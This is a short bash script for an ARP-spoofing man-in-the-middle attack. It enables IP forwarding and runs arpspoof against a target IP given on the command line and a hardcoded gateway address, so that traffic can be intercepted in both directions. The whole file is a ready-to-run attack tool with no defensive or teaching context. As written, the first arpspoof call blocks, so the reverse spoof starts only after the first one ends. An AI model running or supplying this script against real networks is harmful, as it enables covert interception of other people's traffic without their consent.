#!/bin/bash
if [ ! -n "$1" ]
then
  echo "Usage: `basename $0` target_ip."
  exit 65
fi

read IP_FORWARD < /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward
GATEWAY=137.22.73.254
arpspoof -t $1 $GATEWAY
arpspoof -t $GATEWAY $1

killall arpspoof
echo $IP_FORWARD > /proc/sys/net/ipv4/ip_forward
